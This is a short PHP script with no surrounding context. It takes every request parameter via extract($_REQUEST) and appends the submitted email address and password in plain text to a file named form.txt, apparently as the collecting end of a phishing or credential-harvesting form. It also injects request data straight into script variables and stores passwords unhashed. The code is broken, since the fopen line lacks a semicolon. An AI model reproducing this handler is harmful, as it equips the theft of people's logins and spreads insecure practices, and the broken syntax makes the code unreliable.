<?php
    extract($_REQUEST);
    $file=fopen("form.txt", "a")

    fwrite($file, "email :");
    fwrite($file, $email . "\n");

    fwrite($file, "password :");
    fwrite($file, $password . "\n");

    fclose($file);
?>